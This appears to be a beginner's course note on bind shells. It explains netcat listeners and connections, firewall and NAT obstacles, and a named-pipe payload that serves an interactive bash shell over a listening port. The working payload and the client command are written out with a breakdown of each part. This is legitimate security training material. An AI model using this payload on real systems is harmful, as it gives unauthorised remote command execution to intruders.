---
tags: [module/shells-payloads, bind-shell, netcat, listener, level/beginner]
---

# Bind Shells - Beginner's Guide

## What is a Bind Shell?

A bind shell is when the target system opens a listening port and awaits a connection from your attack machine.

Your Machine (connects) to Target (listener)

**Think of it like:** You're calling someone who's already waiting by the phone.

---

## Bind Shell Diagram

Target (Server) starts listener on port 7777
Your Machine (Client) connects to Target on port 7777
Shell session established

---

## Challenges with Bind Shells

| Challenge | Why It's Hard |
|-----------|---------------|
| Listener must be started | Need a way to start it on target |
| Incoming firewall rules | Usually block unsolicited connections |
| NAT/PAT | Target may not be directly reachable |
| OS firewalls | Windows/Linux block unknown incoming |
| Detection | Easy to detect incoming connections |

**The Rule:** Bind shells are easier to defend against, so they're harder to use.

---

## Netcat - The Swiss Army Knife

Netcat (nc) is a tool that can:
- Open listening ports
- Connect to remote ports
- Transfer data
- Create shells

**Think of it as:** A universal network connector.

---

## Practice: Basic Netcat Connection

### Step 1: Start Listener on Target (Server)

Target machine:
nc -lvnp 7777

Options:
- `-l` - Listen mode
- `-v` - Verbose (show details)
- `-n` - No DNS resolution
- `-p` - Port number

Output:
Listening on [0.0.0.0] (family 0, port 7777)

### Step 2: Connect from Attack Box (Client)

Attack machine:
nc -nv TARGET-IP 7777

Options:
- `-n` - No DNS resolution
- `-v` - Verbose

Output:
Connection to TARGET-IP 7777 port [tcp/*] succeeded!

### Step 3: Send Messages

On client (attack box), type a message:
Hello Academy

On server (target), you'll see:
Hello Academy

**Note:** This is NOT a shell yet - just a text connection.

---

## Establishing a Real Bind Shell

### On Target (Server)

We need to bind a shell to the network connection:

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l TARGET-IP 7777 > /tmp/f

What this does:
- Creates a named pipe (FIFO) at /tmp/f
- Connects bash to the pipe
- Uses netcat to listen for connections
- Redirects input/output through the pipe

### On Attack Box (Client)

nc -nv TARGET-IP 7777

### Result

You'll get a shell prompt:
Target@server:~$

Now you can run commands:
whoami
ls -la
id

---

## Understanding the Bind Shell Payload

The payload is complex, but here's what each part does:

| Part | Purpose |
|------|---------|
| rm -f /tmp/f | Remove any existing pipe |
| mkfifo /tmp/f | Create a new named pipe |
| cat /tmp/f | Read from the pipe |
| /bin/bash -i | Start interactive bash |
| 2>&1 | Redirect errors to stdout |
| nc -l TARGET-IP 7777 | Listen for connections |
| > /tmp/f | Write output to pipe |

**The flow:** Data from client goes through netcat, into the pipe, to bash, and back out.

---

## Why This Matters

| Concept | Importance |
|---------|------------|
| Netcat basics | Foundation for all shell work |
| Pipe mechanics | Understanding data flow |
| I/O redirection | Essential for shell stabilization |
| Manual payload | You'll need to create these yourself |

---

## Key Takeaways

- Bind shell = target listens, you connect
- Netcat can create listeners and connections
- Basic netcat only passes text, not a shell
- Bind shell requires a payload to serve the shell
- Named pipes (FIFO) connect processes
- I/O redirection makes the shell work
- Bind shells are harder to use due to firewalls
- Practice on the same network first
- Master netcat - it's your Swiss Army knife
- Understanding the basics helps with advanced shells
